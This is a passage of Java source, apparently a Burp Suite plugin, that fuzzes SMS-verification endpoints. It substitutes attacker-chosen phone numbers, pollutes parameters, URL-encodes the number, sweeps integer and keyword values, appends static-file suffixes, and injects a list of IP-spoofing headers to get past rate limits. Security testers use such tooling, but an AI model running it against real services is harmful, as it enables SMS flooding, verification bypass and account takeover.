        cancelFlags.put(origEntry.id, new AtomicBoolean(false));

        // 分析请求
        IRequestInfo requestInfo = helpers.analyzeRequest(baseRequestResponse);
        List<IParameter> parameters = requestInfo.getParameters();

        boolean testExecuted = false; // 标志是否至少执行一次测试

        // 遍历GET、POST、Cookie参数
        for (IParameter param : parameters) {
            int type = param.getType();
            if (type == IParameter.PARAM_URL || type == IParameter.PARAM_BODY || type == IParameter.PARAM_COOKIE) {
                String value = String.valueOf(param.getValue());
                // 1. 如果是11位数字（手机号）则进行payload测试
                if (isPhoneTestCandidate(value) && selectedNumbers.contains(value)) {
                    testExecuted = true;
                    // 正常的payload测试
                    outer:
                    for (int pi = 0; pi < PAYLOAD_PATTERNS.length; pi++) {
                        // 检查是否取消
                        if (cancelFlags.get(origEntry.id).get()) break outer;
                        // 跳过未启用的类别
                        if (!isPatternEnabled(pi)) continue;
                        String pattern = PAYLOAD_PATTERNS[pi];
                        // 构造一次请求，依次替换所有选中的手机号
                        byte[] reqBuf = baseRequestResponse.getRequest();
                        for (String num : selectedNumbers) {
                            String payload = pattern.replace("xxxxxxxxxxx", num);
                            if (payload.contains("18888888888")) {
                                payload = payload.replace("18888888888", customPhoneNumber);
                            }
                            IParameter np = helpers.buildParameter(param.getName(), payload, (byte) type);
                            reqBuf = helpers.updateParameter(reqBuf, np);
                        }
                        // 发送改造后的请求
                        IHttpRequestResponse rr = callbacks.makeHttpRequest(
                                baseRequestResponse.getHttpService(), reqBuf);
                        int len = rr.getResponse()!=null? rr.getResponse().length : 0;
                        int code = rr.getResponse()!=null?
                                helpers.analyzeResponse(rr.getResponse()).getStatusCode(): 0;
                        IHttpRequestResponsePersisted pr = callbacks.saveBuffersToTempFiles(rr);
                        // 合并 payload 字段用于日志
                        String merged = selectedNumbers.stream()
                                .map(n -> pattern.replace("xxxxxxxxxxx", n))
                                .collect(Collectors.joining(";"));
                        TestLogEntry te = new TestLogEntry(
                                testCounter++, origEntry.id,
                                param.getName() + "_multi", merged,
                                len, 0, code, pr);
                        testLog.add(te);
                        SwingUtilities.invokeLater(() -> {
                            ResultTableModel model = (ResultTableModel) resultTable.getModel();
                            // 如果当前 selectedOriginalId 就是 origEntry.id，则刷新过滤
                            if (selectedOriginalId == origEntry.id) {
                                model.setFilter(origEntry.id);
                                // 滚动到最后一行
                                int rowCount = resultTable.getRowCount();
                                if (rowCount > 0) {
                                    resultTable.scrollRectToVisible(resultTable.getCellRect(rowCount - 1, 0, true));
                                }
                            }
                            // 如果 selectedOriginalId 不匹配，则不刷新 resultTable，此次结果暂不显示，等用户切换到该原始请求时再显示
                        });
                    }
                    // 【新增1】URL编码测试：从第一位开始依次对前 N 位进行URL编码
                    if (urlEncodeTestEnabled) {
                        for (int i = 1; i <= value.length(); i++) {
                            String prefix = value.substring(0, i);
                            String encodedPrefix = alwaysUrlEncode(prefix);
                            String newPhone = encodedPrefix + value.substring(i);
                            IParameter newParam = helpers.buildParameter(param.getName(), newPhone, (byte) type);
                            byte[] newRequest = helpers.updateParameter(baseRequestResponse.getRequest(), newParam);
                            IHttpService httpService = baseRequestResponse.getHttpService();
                            IHttpRequestResponse testResponse = callbacks.makeHttpRequest(httpService, newRequest);
                            int responseLength = (testResponse.getResponse() != null)
                                    ? testResponse.getResponse().length : 0;
                            int responseCode = (testResponse.getResponse() != null)
                                    ? helpers.analyzeResponse(testResponse.getResponse()).getStatusCode() : 0;
                            IHttpRequestResponsePersisted persistedTest = callbacks.saveBuffersToTempFiles(testResponse);
                            TestLogEntry testEntry = new TestLogEntry(
                                    testCounter++, origEntry.id, param.getName() + "_urlencode",
                                    newPhone, responseLength, 0, responseCode, persistedTest);
                            testLog.add(testEntry);
                            SwingUtilities.invokeLater(() -> {
                                ResultTableModel model = (ResultTableModel) resultTable.getModel();
                                if (selectedOriginalId == origEntry.id) {
                                    model.setFilter(origEntry.id);
                                    int rowCount = resultTable.getRowCount();
                                    if (rowCount > 0) {
                                        resultTable.scrollRectToVisible(resultTable.getCellRect(rowCount - 1, 0, true));
                                    }
                                }
                            });
                        }
                    }
                    // duplicate参数测试：在请求体中追加同名参数，值为自定义号码
                    if (combineTestEnabled) {
                        byte[] req = baseRequestResponse.getRequest();
                        IRequestInfo reqInfo = helpers.analyzeRequest(req);
                        List<String> headers = new ArrayList<>(reqInfo.getHeaders());
                        // 获取请求方法，判断是否为 GET 请求
                        String requestLine = headers.get(0); // 例如 "GET /path?foo=bar HTTP/1.1"
                        if (requestLine.startsWith("GET ")) {
                            // 对 GET 请求，从请求行中提取 URL 并追加重复参数
                            String[] parts = requestLine.split(" ");
                            if (parts.length >= 3) {
                                String urlPart = parts[1];
                                // 如果 URL 中已有查询字符串，则追加 &，否则追加 ?
                                if (urlPart.contains("?")) {
                                    urlPart = urlPart + "&" + param.getName() + "=" + customPhoneNumber;
                                } else {
                                    urlPart = urlPart + "?" + param.getName() + "=" + customPhoneNumber;
                                }
                                // 重构请求行
                                String newRequestLine = parts[0] + " " + urlPart + " " + parts[2];
                                headers.set(0, newRequestLine);
                            }
                            byte[] newRequest = helpers.buildHttpMessage(headers, null);
                            IHttpRequestResponse testResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), newRequest);
                            int responseLength = (testResponse.getResponse() != null) ? testResponse.getResponse().length : 0;
                            int responseCode = (testResponse.getResponse() != null) ? helpers.analyzeResponse(testResponse.getResponse()).getStatusCode() : 0;
                            IHttpRequestResponsePersisted persistedTest = callbacks.saveBuffersToTempFiles(testResponse);
                            TestLogEntry testEntry = new TestLogEntry(testCounter++, origEntry.id, param.getName() + "_dup", customPhoneNumber, responseLength, 0, responseCode, persistedTest);
                            testLog.add(testEntry);
                            SwingUtilities.invokeLater(() -> {
                                ResultTableModel model = (ResultTableModel) resultTable.getModel();
                                // 如果当前 selectedOriginalId 就是 origEntry.id，则刷新过滤
                                if (selectedOriginalId == origEntry.id) {
                                    model.setFilter(origEntry.id);
                                    // 滚动到最后一行
                                    int rowCount = resultTable.getRowCount();
                                    if (rowCount > 0) {
                                        resultTable.scrollRectToVisible(resultTable.getCellRect(rowCount - 1, 0, true));
                                    }
                                }
                                // 如果 selectedOriginalId 不匹配，则不刷新 resultTable，此次结果暂不显示，等用户切换到该原始请求时再显示
                            });
                        } else {
                            // 非 GET 请求，原有逻辑：在请求体中追加重复参数
                            int bodyOffset = reqInfo.getBodyOffset();
                            String body = (bodyOffset < req.length) ? helpers.bytesToString(Arrays.copyOfRange(req, bodyOffset, req.length)) : "";
                            String newBody = body + "&" + param.getName() + "=" + customPhoneNumber;
                            byte[] newRequest = helpers.buildHttpMessage(headers, newBody.getBytes(StandardCharsets.UTF_8));
                            IHttpRequestResponse testResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), newRequest);
                            int responseLength = (testResponse.getResponse() != null) ? testResponse.getResponse().length : 0;
                            int responseCode = (testResponse.getResponse() != null) ? helpers.analyzeResponse(testResponse.getResponse()).getStatusCode() : 0;
                            IHttpRequestResponsePersisted persistedTest = callbacks.saveBuffersToTempFiles(testResponse);
                            TestLogEntry testEntry = new TestLogEntry(testCounter++, origEntry.id, param.getName() + "_dup", customPhoneNumber, responseLength, 0, responseCode, persistedTest);
                            testLog.add(testEntry);
                            SwingUtilities.invokeLater(() -> {
                                ResultTableModel model = (ResultTableModel) resultTable.getModel();
                                // 如果当前 selectedOriginalId 就是 origEntry.id，则刷新过滤
                                if (selectedOriginalId == origEntry.id) {
                                    model.setFilter(origEntry.id);
                                    // 滚动到最后一行
                                    int rowCount = resultTable.getRowCount();
                                    if (rowCount > 0) {
                                        resultTable.scrollRectToVisible(resultTable.getCellRect(rowCount - 1, 0, true));
                                    }
                                }
                                // 如果 selectedOriginalId 不匹配，则不刷新 resultTable，此次结果暂不显示，等用户切换到该原始请求时再显示
                            });
                        }
                    }
                }
                // 2. 如果短信接口测试启用，并且参数值为特定关键字，则进行替换测试
                if (smsInterfaceTestEnabled && isSmsKeyword(value)) {
                    testExecuted = true;
                    String[] keywords = {"register", "reg", "regist", "login", "recall", "retrieve", "ret", "true", "false"};
                    for (String kw : keywords) {
                        if (!kw.equalsIgnoreCase(value)) {
                            IParameter newParam = helpers.buildParameter(param.getName(), kw, (byte) type);
                            byte[] newRequest = helpers.updateParameter(baseRequestResponse.getRequest(), newParam);
                            IHttpService httpService = baseRequestResponse.getHttpService();
                            IHttpRequestResponse testResponse = callbacks.makeHttpRequest(httpService, newRequest);
                            int responseLength = (testResponse.getResponse() != null) ? testResponse.getResponse().length : 0;
                            int responseCode = (testResponse.getResponse() != null) ? helpers.analyzeResponse(testResponse.getResponse()).getStatusCode() : 0;
                            IHttpRequestResponsePersisted persistedTest = callbacks.saveBuffersToTempFiles(testResponse);
                            TestLogEntry testEntry = new TestLogEntry(testCounter++, origEntry.id, param.getName() + "_sms", kw, responseLength, 0, responseCode, persistedTest);
                            testLog.add(testEntry);
                            SwingUtilities.invokeLater(() -> {
                                ResultTableModel model = (ResultTableModel) resultTable.getModel();
                                // 如果当前 selectedOriginalId 就是 origEntry.id，则刷新过滤
                                if (selectedOriginalId == origEntry.id) {
                                    model.setFilter(origEntry.id);
                                    // 滚动到最后一行
                                    int rowCount = resultTable.getRowCount();
                                    if (rowCount > 0) {
                                        resultTable.scrollRectToVisible(resultTable.getCellRect(rowCount - 1, 0, true));
                                    }
                                }
                                // 如果 selectedOriginalId 不匹配，则不刷新 resultTable，此次结果暂不显示，等用户切换到该原始请求时再显示
                            });
                        }
                    }
                }
                // 3. 如果短信接口测试启用，并且参数值为整数且在-100到100范围内（86除外），则进行整数替换测试
                if (smsInterfaceTestEnabled && isInteger(value) && isInRange(value)) {
                    testExecuted = true;
                    int origInt = Integer.parseInt(value);
                    for (int i = -100; i <= 100; i++) {
                        if (i != origInt) {
                            IParameter newParam = helpers.buildParameter(param.getName(), String.valueOf(i), (byte) type);
                            byte[] newRequest = helpers.updateParameter(baseRequestResponse.getRequest(), newParam);
                            IHttpService httpService = baseRequestResponse.getHttpService();
                            IHttpRequestResponse testResponse = callbacks.makeHttpRequest(httpService, newRequest);
                            int responseLength = (testResponse.getResponse() != null) ? testResponse.getResponse().length : 0;
                            int responseCode = (testResponse.getResponse() != null) ? helpers.analyzeResponse(testResponse.getResponse()).getStatusCode() : 0;
                            IHttpRequestResponsePersisted persistedTest = callbacks.saveBuffersToTempFiles(testResponse);
                            TestLogEntry testEntry = new TestLogEntry(testCounter++, origEntry.id, param.getName() + "_int", String.valueOf(i), responseLength, 0, responseCode, persistedTest);
                            testLog.add(testEntry);
                            SwingUtilities.invokeLater(() -> {
                                ResultTableModel model = (ResultTableModel) resultTable.getModel();
                                // 如果当前 selectedOriginalId 就是 origEntry.id，则刷新过滤
                                if (selectedOriginalId == origEntry.id) {
                                    model.setFilter(origEntry.id);
                                    // 滚动到最后一行
                                    int rowCount = resultTable.getRowCount();
                                    if (rowCount > 0) {
                                        resultTable.scrollRectToVisible(resultTable.getCellRect(rowCount - 1, 0, true));
                                    }
                                }
                                // 如果 selectedOriginalId 不匹配，则不刷新 resultTable，此次结果暂不显示，等用户切换到该原始请求时再显示
                            });
                        }
                    }
                }
                // 4. 如果启用了组合测试，对手机号参数进行排列组合测试（例如：同时替换payload和追加duplicate参数）
                if (combineTestEnabled && isPhoneTestCandidate(value) && selectedNumbers.contains(value)) {
                    testExecuted = true;
                    outer:
                    for (int pi = 0; pi < PAYLOAD_PATTERNS.length; pi++) {
                        // 检查是否取消
                        if (cancelFlags.get(origEntry.id).get()) break outer;
                        if (!isPatternEnabled(pi)) continue;
                        String pattern = PAYLOAD_PATTERNS[pi];
                        String payload = pattern.replace("xxxxxxxxxxx", value);
                        if (payload.contains("18888888888")) {
                            payload = payload.replace("18888888888", customPhoneNumber);
                        }
                        // 先更新参数
                        byte[] modifiedRequest = helpers.updateParameter(
                                baseRequestResponse.getRequest(),
                                helpers.buildParameter(param.getName(), payload, (byte) type)
                        );
                        IRequestInfo reqInfo = helpers.analyzeRequest(modifiedRequest);
                        List<String> headers = new ArrayList<>(reqInfo.getHeaders());
                        String requestLine = headers.get(0);
                        if (requestLine.startsWith("GET ")) {
                            // 如果是 GET 请求，将 duplicate 参数直接追加到 URL 查询字符串中
                            String[] parts = requestLine.split(" ");
                            if (parts.length >= 3) {
                                String urlPart = parts[1];
                                if (urlPart.contains("?")) {
                                    urlPart = urlPart + "&" + param.getName() + "=" + customPhoneNumber;
                                } else {
                                    urlPart = urlPart + "?" + param.getName() + "=" + customPhoneNumber;
                                }
                                String newRequestLine = parts[0] + " " + urlPart + " " + parts[2];
                                headers.set(0, newRequestLine);
                            }
                            byte[] newRequest = helpers.buildHttpMessage(headers, null);
                            IHttpRequestResponse testResponse = callbacks.makeHttpRequest(
                                    baseRequestResponse.getHttpService(), newRequest);
                            int responseLength = (testResponse.getResponse() != null)
                                    ? testResponse.getResponse().length : 0;
                            int responseCode = (testResponse.getResponse() != null)
                                    ? helpers.analyzeResponse(testResponse.getResponse()).getStatusCode() : 0;
                            IHttpRequestResponsePersisted persistedTest = callbacks.saveBuffersToTempFiles(testResponse);
                            TestLogEntry testEntry = new TestLogEntry(
                                    testCounter++, origEntry.id, param.getName() + "_combo",
                                    payload + " + dup:" + customPhoneNumber, responseLength, 0, responseCode, persistedTest);
                            testLog.add(testEntry);
                            SwingUtilities.invokeLater(() -> {
                                ResultTableModel model = (ResultTableModel) resultTable.getModel();
                                // 如果当前 selectedOriginalId 就是 origEntry.id，则刷新过滤
                                if (selectedOriginalId == origEntry.id) {
                                    model.setFilter(origEntry.id);
                                    // 滚动到最后一行
                                    int rowCount = resultTable.getRowCount();
                                    if (rowCount > 0) {
                                        resultTable.scrollRectToVisible(resultTable.getCellRect(rowCount - 1, 0, true));
                                    }
                                }
                                // 如果 selectedOriginalId 不匹配，则不刷新 resultTable，此次结果暂不显示，等用户切换到该原始请求时再显示
                            });
                        } else {
                            // 非 GET 请求，继续在请求体中追加 duplicate 参数
                            int bodyOffset = reqInfo.getBodyOffset();
                            String body = (bodyOffset < modifiedRequest.length)
                                    ? helpers.bytesToString(Arrays.copyOfRange(modifiedRequest, bodyOffset, modifiedRequest.length))
                                    : "";
                            String newBody = body + "&" + param.getName() + "=" + customPhoneNumber;
                            byte[] newRequest = helpers.buildHttpMessage(headers, newBody.getBytes(StandardCharsets.UTF_8));
                            IHttpRequestResponse testResponse = callbacks.makeHttpRequest(
                                    baseRequestResponse.getHttpService(), newRequest);
                            int responseLength = (testResponse.getResponse() != null)
                                    ? testResponse.getResponse().length : 0;
                            int responseCode = (testResponse.getResponse() != null)
                                    ? helpers.analyzeResponse(testResponse.getResponse()).getStatusCode() : 0;
                            IHttpRequestResponsePersisted persistedTest = callbacks.saveBuffersToTempFiles(testResponse);
                            TestLogEntry testEntry = new TestLogEntry(
                                    testCounter++, origEntry.id, param.getName() + "_combo",
                                    payload + " + dup:" + customPhoneNumber, responseLength, 0, responseCode, persistedTest);
                            testLog.add(testEntry);
                            SwingUtilities.invokeLater(() -> {
                                ResultTableModel model = (ResultTableModel) resultTable.getModel();
                                // 如果当前 selectedOriginalId 就是 origEntry.id，则刷新过滤
                                if (selectedOriginalId == origEntry.id) {
                                    model.setFilter(origEntry.id);
                                    // 滚动到最后一行
                                    int rowCount = resultTable.getRowCount();
                                    if (rowCount > 0) {
                                        resultTable.scrollRectToVisible(resultTable.getCellRect(rowCount - 1, 0, true));
                                    }
                                }
                                // 如果 selectedOriginalId 不匹配，则不刷新 resultTable，此次结果暂不显示，等用户切换到该原始请求时再显示
                            });
                        }
                    }
                }
            }
        }
        // 增加对请求路径检测：路径末尾是 11 位数字、且用户在选择对话框里勾选了它，才进行测试
        // PAYLOAD_PATTERNS 循环仍按已启用类别过滤；URL 编码块按 urlEncodeTestEnabled 控制
        String path = url.getPath();
        String phoneFromPath = (path != null && path.matches(".*\\d{11}$"))
                ? path.replaceAll(".*?(\\d{11})$", "$1") : null;
        if (phoneFromPath != null && selectedNumbers.contains(phoneFromPath)) {
            testExecuted = true;
            outer:
            // 遍历 payload 模板，对该号码进行 fuzz 测试
            for (int pi = 0; pi < PAYLOAD_PATTERNS.length; pi++) {
                // 检查是否取消
                if (cancelFlags.get(origEntry.id).get()) break outer;
                if (!isPatternEnabled(pi)) continue;
                String pattern = PAYLOAD_PATTERNS[pi];
                String payload = pattern.replace("xxxxxxxxxxx", phoneFromPath);
                if (payload.contains("18888888888")) {
                    payload = payload.replace("18888888888", customPhoneNumber);
                }
                // 复制请求头列表，修改请求行
                List<String> headers = new ArrayList<>(requestInfo.getHeaders());
                String firstHeader = headers.get(0); // 请求行，例如 "GET /firstLogin/sendSms/18088888888 HTTP/1.1"
                // 替换请求行中的原号码为 payload
                String newRequestLine = firstHeader.replace(phoneFromPath, payload);
                headers.set(0, newRequestLine);
                // 获取请求体（如果有）
                int bodyOffset = requestInfo.getBodyOffset();
                byte[] req = baseRequestResponse.getRequest();
                byte[] bodyBytes = (bodyOffset < req.length) ? Arrays.copyOfRange(req, bodyOffset, req.length) : new byte[0];
                // 构造新的 HTTP 请求
                byte[] newRequest = helpers.buildHttpMessage(headers, bodyBytes);
                IHttpService httpService = baseRequestResponse.getHttpService();
                IHttpRequestResponse testResponse = callbacks.makeHttpRequest(httpService, newRequest);
                int responseLength = (testResponse.getResponse() != null) ? testResponse.getResponse().length : 0;
                int responseCode = (testResponse.getResponse() != null) ? helpers.analyzeResponse(testResponse.getResponse()).getStatusCode() : 0;
                IHttpRequestResponsePersisted persistedTest = callbacks.saveBuffersToTempFiles(testResponse);
                // 记录测试结果，将参数名称设为 "path"
                TestLogEntry testEntry = new TestLogEntry(testCounter++, origEntry.id, "path", payload, responseLength, 0, responseCode, persistedTest);
                testLog.add(testEntry);
                SwingUtilities.invokeLater(() -> {
                    ResultTableModel model = (ResultTableModel) resultTable.getModel();
                    // 如果当前 selectedOriginalId 就是 origEntry.id，则刷新过滤
                    if (selectedOriginalId == origEntry.id) {
                        model.setFilter(origEntry.id);
                        // 滚动到最后一行
                        int rowCount = resultTable.getRowCount();
                        if (rowCount > 0) {
                            resultTable.scrollRectToVisible(resultTable.getCellRect(rowCount - 1, 0, true));
                        }
                    }
                    // 如果 selectedOriginalId 不匹配，则不刷新 resultTable，此次结果暂不显示，等用户切换到该原始请求时再显示
                });
            }
            // 路径末尾号码的渐进 URL 编码：从第一位开始对前 N 位字符做百分号编码，独立于 PAYLOAD_PATTERNS 类别
            // 这样用户即使关掉所有 PayloadCategory，只要勾了"渐进 URL 编码"，路径号码也能产生测试数据
            if (urlEncodeTestEnabled) {
                List<String> origReqHeaders = requestInfo.getHeaders();
                String firstHeader = origReqHeaders.get(0);
                int origBodyOffset = requestInfo.getBodyOffset();
                byte[] origReq = baseRequestResponse.getRequest();
                byte[] origBody = (origBodyOffset < origReq.length)
                        ? Arrays.copyOfRange(origReq, origBodyOffset, origReq.length) : new byte[0];
                for (int i = 1; i <= phoneFromPath.length(); i++) {
                    if (cancelFlags.get(origEntry.id).get()) break;
                    String prefix = phoneFromPath.substring(0, i);
                    String newPhone = alwaysUrlEncode(prefix) + phoneFromPath.substring(i);
                    List<String> newHeaders = new ArrayList<>(origReqHeaders);
                    newHeaders.set(0, firstHeader.replace(phoneFromPath, newPhone));
                    byte[] newRequest = helpers.buildHttpMessage(newHeaders, origBody);
                    IHttpRequestResponse testResponse = callbacks.makeHttpRequest(
                            baseRequestResponse.getHttpService(), newRequest);
                    int responseLength = (testResponse.getResponse() != null)
                            ? testResponse.getResponse().length : 0;
                    int responseCode = (testResponse.getResponse() != null)
                            ? helpers.analyzeResponse(testResponse.getResponse()).getStatusCode() : 0;
                    IHttpRequestResponsePersisted persistedTest = callbacks.saveBuffersToTempFiles(testResponse);
                    TestLogEntry testEntry = new TestLogEntry(testCounter++, origEntry.id,
                            "path_urlencode", newPhone, responseLength, 0, responseCode, persistedTest);
                    testLog.add(testEntry);
                    SwingUtilities.invokeLater(() -> {
                        ResultTableModel model = (ResultTableModel) resultTable.getModel();
                        if (selectedOriginalId == origEntry.id) {
                            model.setFilter(origEntry.id);
                            int rowCount = resultTable.getRowCount();
                            if (rowCount > 0) {
                                resultTable.scrollRectToVisible(resultTable.getCellRect(rowCount - 1, 0, true));
                            }
                        }
                    });
                }
            }
        }
        // 增加针对所有 POST 请求，在路径末尾追加静态文件后缀进行发包测试
        IRequestInfo originalReqInfo = helpers.analyzeRequest(baseRequestResponse.getRequest());
        List<String> origHeaders = new ArrayList<>(originalReqInfo.getHeaders());
        String reqLine = origHeaders.get(0); // 请求行，如 "POST /api/sms/smsCode/ HTTP/1.1"
        if (postExtTestEnabled && reqLine.startsWith("POST ")) {
            // 将请求行拆分为：方法、URL部分、协议版本
            String[] parts = reqLine.split(" ");
            if(parts.length >= 3) {
                // 获取URL部分，并去除末尾多余的斜杠
                String urlPart = parts[1];
                while(urlPart.endsWith("/")) {
                    urlPart = urlPart.substring(0, urlPart.length() - 1);
                }
                // 定义需要测试的静态文件后缀
                String[] staticExts = {".js", ".json", ".html", ".css", ".jpg", ".png", ".txt", ".mp3", ".mp4", ".icon", ";.js", ";.json", ";.html", ";.css", ";.jpg", ";.png", ";.txt", ";.mp3", ";.mp4", ";.icon"};
                // 获取原始请求体内容
                int bodyOffset = originalReqInfo.getBodyOffset();
                byte[] bodyBytes = (bodyOffset < baseRequestResponse.getRequest().length)
                        ? Arrays.copyOfRange(baseRequestResponse.getRequest(), bodyOffset, baseRequestResponse.getRequest().length)
                        : new byte[0];
                outer:
                for (String ext : staticExts) {
                    // 检查是否取消
                    if (cancelFlags.get(origEntry.id).get()) break outer;
                    // 构造新的 URL：在去除多余斜杠的URL后追加后缀
                    String newUrlPart = urlPart + ext;
                    // 重构请求行
                    String newRequestLine = parts[0] + " " + newUrlPart + " " + parts[2];
                    // 克隆原始请求头列表并替换第一行
                    List<String> newHeaders = new ArrayList<>(origHeaders);
                    newHeaders.set(0, newRequestLine);

                    // 构造新的 HTTP 请求（POST 请求带请求体）
                    byte[] newRequest = helpers.buildHttpMessage(newHeaders, bodyBytes);
                    IHttpService httpService = baseRequestResponse.getHttpService();
                    IHttpRequestResponse testResponse = callbacks.makeHttpRequest(httpService, newRequest);

                    int responseLength = (testResponse.getResponse() != null)
                            ? testResponse.getResponse().length : 0;
                    int responseCode = (testResponse.getResponse() != null)
                            ? helpers.analyzeResponse(testResponse.getResponse()).getStatusCode() : 0;
                    IHttpRequestResponsePersisted persistedTest = callbacks.saveBuffersToTempFiles(testResponse);

                    // 记录测试结果，参数名称记录为 "postExt"，payload 为使用的后缀
                    TestLogEntry testEntry = new TestLogEntry(
                            testCounter++, origEntry.id, "postExt", ext,
                            responseLength, 0, responseCode, persistedTest);
                    testLog.add(testEntry);
                    SwingUtilities.invokeLater(() -> {
                        ResultTableModel model = (ResultTableModel) resultTable.getModel();
                        // 如果当前 selectedOriginalId 就是 origEntry.id，则刷新过滤
                        if (selectedOriginalId == origEntry.id) {
                            model.setFilter(origEntry.id);
                            // 滚动到最后一行
                            int rowCount = resultTable.getRowCount();
                            if (rowCount > 0) {
                                resultTable.scrollRectToVisible(resultTable.getCellRect(rowCount - 1, 0, true));
                            }
                        }
                        // 如果 selectedOriginalId 不匹配，则不刷新 resultTable，此次结果暂不显示，等用户切换到该原始请求时再显示
                    });
                }
            }
        }

        // 【新增2】额外请求头测试用例：在原始请求头中增加一组固定的IP相关头部，然后发包
        if (extraHeadersTestEnabled) {
            // 定义需要追加的额外请求头
            String[] extraHeaders = {
                    "X-Forwarded-For: 127.0.0.1",
                    "X-Forwarded: 127.0.0.1",
                    "Forwarded-For: 127.0.0.1",
                    "Forwarded: 127.0.0.1",
                    "X-Requested-With: 127.0.0.1",
                    "X-Forwarded-Proto: 127.0.0.1",
                    "X-Forwarded-Host: 127.0.0.1",
                    "X-remote-IP: 127.0.0.1",
                    "X-remote-addr: 127.0.0.1",
                    "True-Client-IP: 127.0.0.1",
                    "X-Client-IP: 127.0.0.1",
                    "Client-IP: 127.0.0.1",
                    "X-Real-IP: 127.0.0.1",
                    "Ali-CDN-Real-IP: 127.0.0.1",
                    "Cdn-Src-Ip: 127.0.0.1",
                    "Cdn-Real-Ip: 127.0.0.1",
                    "CF-Connecting-IP: 127.0.0.1",
                    "X-Cluster-Client-IP: 127.0.0.1",
                    "WL-Proxy-Client-IP: 127.0.0.1",
                    "Proxy-Client-IP: 127.0.0.1",
                    "Fastly-Client-Ip: 127.0.0.1",
                    "True-Client-Ip: 127.0.0.1",
                    "X-Originating-IP: 127.0.0.1",
                    "X-Host: 127.0.0.1",
                    "X-Custom-IP-Authorization: 127.0.0.1"
            };
            // 将额外请求头追加到原始头部列表中
            for (String h : extraHeaders) {
                origHeaders.add(h);
            }
            // 获取原始请求体（如果存在）
            int bodyOffset = originalReqInfo.getBodyOffset();
            byte[] bodyBytes = (bodyOffset < baseRequestResponse.getRequest().length)
                    ? Arrays.copyOfRange(baseRequestResponse.getRequest(), bodyOffset, baseRequestResponse.getRequest().length)
                    : new byte[0];
            byte[] newRequest = helpers.buildHttpMessage(origHeaders, bodyBytes);
            IHttpService httpService = baseRequestResponse.getHttpService();
            IHttpRequestResponse testResponse = callbacks.makeHttpRequest(httpService, newRequest);
            int responseLength = (testResponse.getResponse() != null)
                    ? testResponse.getResponse().length : 0;
            int responseCode = (testResponse.getResponse() != null)
                    ? helpers.analyzeResponse(testResponse.getResponse()).getStatusCode() : 0;
            IHttpRequestResponsePersisted persistedTest = callbacks.saveBuffersToTempFiles(testResponse);
            TestLogEntry testEntry = new TestLogEntry(
                    testCounter++, origEntry.id, "extraHeaders", "Add extra headers",
                    responseLength, 0, responseCode, persistedTest);
            testLog.add(testEntry);
            SwingUtilities.invokeLater(() -> {
                ResultTableModel model = (ResultTableModel) resultTable.getModel();
                // 如果当前 selectedOriginalId 就是 origEntry.id，则刷新过滤
                if (selectedOriginalId == origEntry.id) {
                    model.setFilter(origEntry.id);
                    // 滚动到最后一行
                    int rowCount = resultTable.getRowCount();
                    if (rowCount > 0) {
                        resultTable.scrollRectToVisible(resultTable.getCellRect(rowCount - 1, 0, true));
                    }
                }
                // 如果 selectedOriginalId 不匹配，则不刷新 resultTable，此次结果暂不显示，等用户切换到该原始请求时再显示
            });
        }


        // 判断是否为JSON格式请求（通过Content-Type判断）
        List<String> headers = requestInfo.getHeaders();
        boolean isJson = false;
        for (String header : headers) {
            if (header.toLowerCase().contains("application/json")) {
                isJson = true;
                break;
            }
        }
        if (isJson) {
            byte[] req = baseRequestResponse.getRequest();
            int bodyOffset = requestInfo.getBodyOffset();
            String body = helpers.bytesToString(Arrays.copyOfRange(req, bodyOffset, req.length)).trim();

            try {
                Object json = parseJson(body);
                // 递归处理JSON，若有字段满足条件则返回true
                // 传入根对象 json 作为 root，path 为空表示从根开始
                boolean jsonExecuted = processJsonAndTest(json, json, new ArrayList<>(), baseRequestResponse, headers, origEntry);
                testExecuted |= jsonExecuted;
            } catch (Exception ex) {
                callbacks.printOutput("JSON解析失败: " + ex.getMessage());
            }
        }

        if (testExecuted) {
            origEntry.state = "测试完毕";
            fireTableDataChanged();
        }
    }



    /**
     * 递归处理JSONObject和JSONArray，查找值为11位数字、特定关键字或整数的字段，并进行测试。
     * 关键修复：测试请求始终基于"根 JSON 对象"序列化，而不是当前递归到的子对象，避免丢失外层结构。
     *
     * @param node    当前递归到的节点（可能是嵌套子对象/子数组）
     * @param root    根 JSON 对象（最外层 JSONObject 或 JSONArray），用于序列化完整请求体
     * @param path    从 root 到 node 的路径，元素为 String（对象 key）或 Integer（数组下标）
     * @return 至少执行了一次测试请求时返回 true
     */
    private boolean processJsonAndTest(Object node, Object root, List<Object> path,
                                       IHttpRequestResponse baseRequestResponse,
                                       List<String> headers, OriginalLogEntry origEntry) {
        boolean executed = false;
        if (node instanceof JSONObject) {
            JSONObject obj = (JSONObject) node;
            for (String key : new ArrayList<>(obj.keySet())) {
                Object valueObj = obj.get(key);
                List<Object> childPath = new ArrayList<>(path);
                childPath.add(key);
                if (valueObj instanceof String || valueObj instanceof Number) {
                    executed |= testJsonLeaf(valueObj.toString(), root, childPath, key,
                            baseRequestResponse, headers, origEntry);
                } else if (valueObj instanceof JSONObject || valueObj instanceof JSONArray) {
                    executed |= processJsonAndTest(valueObj, root, childPath,
                            baseRequestResponse, headers, origEntry);
                }
            }
        } else if (node instanceof JSONArray) {
            JSONArray arr = (JSONArray) node;
            for (int i = 0; i < arr.length(); i++) {
                Object element = arr.get(i);
                List<Object> childPath = new ArrayList<>(path);
                childPath.add(i);
                if (element instanceof String || element instanceof Number) {
                    executed |= testJsonLeaf(element.toString(), root, childPath, "[" + i + "]",
                            baseRequestResponse, headers, origEntry);
                } else if (element instanceof JSONObject || element instanceof JSONArray) {
                    executed |= processJsonAndTest(element, root, childPath,
                            baseRequestResponse, headers, origEntry);
                }
            }
        }
        return executed;
    }

    /**
     * 对一个 JSON 叶子节点执行所有适用的测试策略：手机号 payload、组合（duplicate key）、
     * SMS 关键字替换、整数替换。每次测试都基于 root 的深拷贝按 path 写入新值并序列化整个请求体。
     */
    private boolean testJsonLeaf(String str, Object root, List<Object> path, String paramLabel,
                                 IHttpRequestResponse baseRequestResponse,
                                 List<String> headers, OriginalLogEntry origEntry) {
        boolean executed = false;

        // 1. 手机号 payload 测试
        if (isPhoneTestCandidate(str) && selectedNumbers.contains(str)) {
            executed = true;
            for (int pi = 0; pi < PAYLOAD_PATTERNS.length; pi++) {
                if (cancelFlags.get(origEntry.id).get()) break;
                if (!isPatternEnabled(pi)) continue;
                String pattern = PAYLOAD_PATTERNS[pi];
                String payload = pattern.replace("xxxxxxxxxxx", str);
                if (payload.contains("18888888888")) {
